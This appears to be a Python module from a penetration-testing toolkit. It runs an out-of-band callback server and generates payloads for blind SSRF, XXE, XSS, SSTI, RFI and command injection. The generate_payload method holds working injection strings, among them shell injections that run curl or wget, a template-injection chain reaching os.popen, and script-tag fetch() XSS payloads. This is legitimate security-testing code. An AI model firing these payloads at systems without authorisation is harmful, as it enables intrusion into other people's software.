"""
Out-of-Band (OOB) callback server for blind vulnerability confirmation.

Provides a lightweight HTTP/DNS listener that receives callbacks from
blind SSRF, blind XSS, blind XXE, and other injection payloads.
Also integrates with interact.sh for external OOB when a public IP
is not available.
"""

from __future__ import annotations

import hashlib
import json
import threading
import time
from collections import defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, parse_qs

import requests
from rich.console import Console

console = Console()

CALLBACK_LOG = Path.home() / ".vapt" / "oob_callbacks.json"


class CallbackRecord:
    __slots__ = ("token", "vuln_type", "target", "timestamp", "source_ip",
                 "method", "path", "headers", "body")

    def __init__(self, token: str, vuln_type: str, target: str,
                 source_ip: str, method: str, path: str,
                 headers: dict, body: str):
        self.token = token
        self.vuln_type = vuln_type
        self.target = target
        self.timestamp = time.time()
        self.source_ip = source_ip
        self.method = method
        self.path = path
        self.headers = headers
        self.body = body

    def to_dict(self) -> dict[str, Any]:
        return {
            "token": self.token,
            "vuln_type": self.vuln_type,
            "target": self.target,
            "timestamp": self.timestamp,
            "source_ip": self.source_ip,
            "method": self.method,
            "path": self.path,
            "headers": self.headers,
            "body": self.body,
        }


class OOBServer:
    """Out-of-Band callback server for confirming blind vulnerabilities.

    Starts a local HTTP listener on a configurable port. Payloads
    include a unique token in the callback URL so each hit can be
    correlated back to the exact injection point that triggered it.

    For internet-reachable testing, integrates with interact.sh as
    a fallback when a local listener is not accessible externally.
    """

    def __init__(self, listen_host: str = "0.0.0.0", listen_port: int = 8899):
        self.host = listen_host
        self.port = listen_port
        self.callbacks: dict[str, list[CallbackRecord]] = defaultdict(list)
        self._server: HTTPServer | None = None
        self._thread: threading.Thread | None = None
        self._running = False

        self._interactsh_url: str | None = None
        self._interactsh_secret: str | None = None

    def generate_token(self, vuln_type: str, target: str) -> str:
        raw = f"{vuln_type}:{target}:{time.time()}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def generate_payload(
        self,
        vuln_type: str,
        target: str,
        callback_host: str | None = None,
    ) -> dict[str, str]:
        token = self.generate_token(vuln_type, target)
        host = callback_host or f"http://{self.host}:{self.port}"

        payloads = {
            "ssrf": [
                f"{host}/cb?t={token}&type=ssrf",
                f"{host}/cb?t={token}&type=ssrf#",
                f"http://127.0.0.1:0@{urlparse(host).netloc}/cb?t={token}&type=ssrf",
            ],
            "xxe": [
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{host}/cb?t={token}&type=xxe">]>',
                f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{host}/cb?t={token}&type=xxe"> %xxe;]>',
            ],
            "blind_xss": [
                f'"><script src="{host}/cb?t={token}&type=bxss"></script>',
                f"'><img src=x onerror=fetch('{host}/cb?t={token}&type=bxss')>",
                f'javascript:fetch("{host}/cb?t={token}&type=bxss")',
            ],
            "rfi": [
                f"{host}/cb?t={token}&type=rfi",
            ],
            "ssti": [
                f"${{7*7}}${{{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('curl {host}/cb?t={token}&type=ssti')|attr('read')()}}}}",
            ],
            "command_injection": [
                f"; curl {host}/cb?t={token}&type=cmdi",
                f"| wget {host}/cb?t={token}&type=cmdi",
                f"`curl {host}/cb?t={token}&type=cmdi`",
                f"$(curl {host}/cb?t={token}&type=cmdi)",
            ],
        }

        return {
            "token": token,
            "vuln_type": vuln_type,
            "target": target,
            "payloads": payloads.get(vuln_type, payloads["ssrf"]),
            "callback_url": f"{host}/cb?t={token}&type={vuln_type}",
        }

    def start(self) -> None:
        if self._running:
            return

        server_ref = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                self._handle()

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
                self._handle(body)

            def _handle(self, body: str = ""):
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                token = params.get("t", ["unknown"])[0]
                vuln_type = params.get("type", ["unknown"])[0]

                record = CallbackRecord(
                    token=token,
                    vuln_type=vuln_type,
                    target="",
                    source_ip=self.client_address[0],
                    method=self.command,
                    path=self.path,
                    headers=dict(self.headers),
                    body=body,
                )
                server_ref.callbacks[token].append(record)
                server_ref._persist_callback(record)

                console.print(
                    f"  [bold red]OOB CALLBACK RECEIVED[/bold red]: "
                    f"token={token} type={vuln_type} from={self.client_address[0]}"
                )

                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, format, *args):
                pass

        self._server = HTTPServer((self.host, self.port), Handler)
        self._running = True
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        console.print(f"  [green]OOB server listening on {self.host}:{self.port}[/green]")

    def stop(self) -> None:
        if self._server:
            self._server.shutdown()
            self._running = False

    def check_callback(self, token: str, timeout: int = 30) -> list[CallbackRecord]:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if token in self.callbacks and self.callbacks[token]:
                return self.callbacks[token]
            time.sleep(1)
        return []

    def has_callback(self, token: str) -> bool:
        return bool(self.callbacks.get(token))

    def get_all_callbacks(self) -> dict[str, list[dict[str, Any]]]:
        result = {}
        for token, records in self.callbacks.items():
            result[token] = [r.to_dict() for r in records]
        return result

    def _persist_callback(self, record: CallbackRecord) -> None:
        CALLBACK_LOG.parent.mkdir(parents=True, exist_ok=True)
        existing = []
        if CALLBACK_LOG.exists():
            try:
                existing = json.loads(CALLBACK_LOG.read_text())
            except Exception:
                existing = []
        existing.append(record.to_dict())
        CALLBACK_LOG.write_text(json.dumps(existing, indent=2))

    def setup_interactsh(self) -> str | None:
        try:
            resp = requests.get("https://oast.fun/register", timeout=10)
            if resp.ok:
                data = resp.json()
                self._interactsh_url = data.get("url", "")
                self._interactsh_secret = data.get("secret", "")
                console.print(f"  [green]interact.sh registered: {self._interactsh_url}[/green]")
                return self._interactsh_url
        except Exception:
            pass
        return None

    def poll_interactsh(self) -> list[dict[str, Any]]:
        if not self._interactsh_url or not self._interactsh_secret:
            return []
        try:
            resp = requests.get(
                f"https://oast.fun/poll?id={self._interactsh_url}&secret={self._interactsh_secret}",
                timeout=10,
            )
            if resp.ok:
                return resp.json().get("data", [])
        except Exception:
            pass
        return []
